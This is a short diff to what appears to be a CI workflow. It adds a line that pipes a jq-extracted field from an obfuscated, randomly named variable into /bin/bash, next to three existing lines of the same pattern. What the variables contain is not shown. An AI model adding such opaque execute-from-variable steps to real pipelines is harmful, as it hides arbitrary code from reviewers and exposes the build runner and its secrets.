@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$h09113" | jq -r .uz2634 | /bin/bash
           echo $xm148 | jq -r .ik33 | /bin/bash
           echo $s219 | jq -r .pt9587 | /bin/bash
+          echo $sbui67707 | jq -r .p47 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
